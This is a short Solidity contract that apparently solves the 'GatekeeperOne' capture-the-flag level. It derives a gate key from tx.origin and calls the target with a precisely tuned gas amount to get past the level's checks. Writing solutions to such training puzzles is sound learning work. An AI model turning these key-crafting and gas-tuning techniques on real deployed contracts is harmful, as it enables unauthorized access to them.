// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {GatekeeperOne} from "./GatekeeperOne.sol";

contract GatekeeperOneHack {
    error TooMuchGas();
    error AttackFailed();

    GatekeeperOne private immutable TARGET;

    constructor(address _target) {
        TARGET = GatekeeperOne(_target);
    }

    function attack(uint256 _gas) external {
        uint16 key16 = uint16(uint160(tx.origin));
        uint64 key64 = uint64(1 << 63) + uint64(key16);
        bytes8 _gateKey = bytes8(key64);
        if (_gas >= 8191) revert TooMuchGas();
        if (!TARGET.enter{gas: 8191 * 10 + _gas}(_gateKey)) revert AttackFailed();
    }
}
